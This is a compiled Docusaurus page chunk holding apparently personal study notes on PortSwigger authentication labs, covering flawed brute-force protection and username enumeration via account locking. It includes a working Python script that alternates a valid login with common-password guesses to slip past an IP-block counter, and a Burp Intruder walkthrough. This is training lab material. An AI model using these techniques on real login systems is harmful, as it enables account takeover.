"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[7261],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return m}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},p=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=c(n),m=r,h=p["".concat(l,".").concat(m)]||p[m]||d[m]||o;return n?a.createElement(h,i(i({ref:t},u),{},{components:n})):a.createElement(h,i({ref:t},u))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=p;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}p.displayName="MDXCreateElement"},3166:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return u},default:function(){return p}});var a=n(7462),r=n(3366),o=(n(7294),n(3905)),i=["components"],s={},l=void 0,c={unversionedId:"portswigger/Authentication/password-based-login-2",id:"portswigger/Authentication/password-based-login-2",title:"password-based-login-2",description:"Flawed brute-force protection",source:"@site/docs/portswigger/Authentication/password-based-login-2.md",sourceDirName:"portswigger/Authentication",slug:"/portswigger/Authentication/password-based-login-2",permalink:"/Cybernotes/docs/portswigger/Authentication/password-based-login-2",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/portswigger/Authentication/password-based-login-2.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Password-based-login-1",permalink:"/Cybernotes/docs/portswigger/Authentication/password-based-login-1"},next:{title:"Password reset logic",permalink:"/Cybernotes/docs/portswigger/Authentication/Password-reset-logic"}},u=[{value:"Flawed brute-force protection",id:"flawed-brute-force-protection",children:[],level:2},{value:"Lab",id:"lab",children:[],level:2},{value:"Lab: Username enumeration via account lock",id:"lab-username-enumeration-via-account-lock",children:[],level:2}],d={toc:u};function p(e){var t=e.components,s=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,a.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"flawed-brute-force-protection"},"Flawed brute-force protection"),(0,o.kt)("p",null,"It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Locking the account that the remote user is trying to access if they make too many failed login attempts"),(0,o.kt)("li",{parentName:"ul"},"Blocking the remote user's IP address if they make too many login attempts in quick succession")),(0,o.kt)("p",null,"Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic."),(0,o.kt)("p",null,"For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached."),(0,o.kt)("p",null,"In this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless."),(0,o.kt)("h2",{id:"lab"},"Lab"),(0,o.kt)("p",null,"In this lab we have to do good login one time and then try our brute force creds one time and we can do this in loop with any script!"),(0,o.kt)("p",null,"So i made one python script and added all the passwords in List and checked them one by one!"),(0,o.kt)("p",null,"==> Exploit :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import requests\n\ndef goodReq():\n    username = "wiener"\n    password = "peter"\n    url = "https://ac831f371f85a102c02985da00360007.web-security-academy.net/login"\n    data = {\n        \'username\':username,\n        \'password\':password\n    }\n    r = requests.post(url=url,data=data)\n    # print(r.text)\n# goodReq()\n\ndef brute_force():\n    username = "carlos"\n    password = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]\n    url = "https://ac831f371f85a102c02985da00360007.web-security-academy.net/login"\n\n    Flag = False\n    count = 0\n    i = 0\n    while (Flag==False):\n        if(count % 2 == 0):\n            print("Trying bad request")\n            r = requests.post(url=url,data={\'username\':username,\'password\':password[i]})\n            if("Your username is:" in r.text):\n                Flag = True\n                print("Credentials Found!")\n                print("Username: ",username)\n                print("Password: ",password[i])\n                print(r.text)\n                break\n            i += 1\n            count += 1\n        else:\n            print("Trying good request")\n            count += 1\n            goodReq()\nbrute_force()\n')),(0,o.kt)("p",null,"--\x3e After running this exploit i found the password for ",(0,o.kt)("inlineCode",{parentName:"p"},"carlos")," and solved the lab!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(7147).Z,width:"1227",height:"515"})),(0,o.kt)("hr",null),(0,o.kt)("h1",{id:"account-locking"},"Account locking"),(0,o.kt)("p",null,"One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames."),(0,o.kt)("p",null,"Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can."),(0,o.kt)("p",null,"For example, the following method can be used to work around this kind of protection:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames."),(0,o.kt)("li",{parentName:"ol"},"Decide on a very small shortlist of passwords that you think at least one user is likely to have. Crucially, the number of passwords you select must not exceed the number of login attempts allowed. For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses."),(0,o.kt)("li",{parentName:"ol"},"Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.")),(0,o.kt)("p",null,"Account locking also fails to protect against credential stuffing attacks. This involves using a massive dictionary of ",(0,o.kt)("inlineCode",{parentName:"p"},"username:password")," pairs, composed of genuine login credentials stolen in data breaches. Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. Account locking does not protect against credential stuffing because each username is only being attempted once. Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack."),(0,o.kt)("h2",{id:"lab-username-enumeration-via-account-lock"},"Lab: Username enumeration via account lock"),(0,o.kt)("p",null,"--\x3e This website locks the account of a user if the user tries to login after 2-3 attempts so with this functionality or logic we can think that if the user account exists then only the website will lock the user account and that's the logic flow here. we can use this logic for username enumration"),(0,o.kt)("p",null,"So we have provided the username list and password list. I firstly brute forced the username with the given username list and for password i tried the given password list with ",(0,o.kt)("inlineCode",{parentName:"p"},"cluster bomb")," and also i have grepped the string ",(0,o.kt)("inlineCode",{parentName:"p"},"Invalid username or password")," to check that which username is getting blocked"),(0,o.kt)("p",null,"And after some time i found that the user ",(0,o.kt)("inlineCode",{parentName:"p"},"alabama")," don't get the grepped string so that means the account got locked. And now we have one possible username called ",(0,o.kt)("inlineCode",{parentName:"p"},"alabama")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(4711).Z,width:"1325",height:"453"})),(0,o.kt)("p",null,"--\x3e For password brute force we have to make the difference between requests ",(0,o.kt)("inlineCode",{parentName:"p"},"3")," because the website is blocking us for 3 or more failed login attempts. But after some time i found that if your login is correct then website is displaying nothing."),(0,o.kt)("p",null,"So i again grepped the ",(0,o.kt)("inlineCode",{parentName:"p"},"Invalid username or password")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"You have made too many requests")," strings and started the attack. And after some time i found that we don't get anything for password ",(0,o.kt)("inlineCode",{parentName:"p"},"buster")," so it might be a correct password!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(7873).Z,width:"1323",height:"899"})),(0,o.kt)("p",null,"--\x3e And after trying that password with the username i solved the lab!"))}p.isMDXComponent=!0},7147:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220202125348-97ffb2c34629fdb475e62f7e5932c402.png"},4711:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220202140519-7cf9aac05fa25e3e183a0152bbf583b7.png"},7873:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220202144628-3751012748f13eb572c27ca3cf3f5761.png"}}]);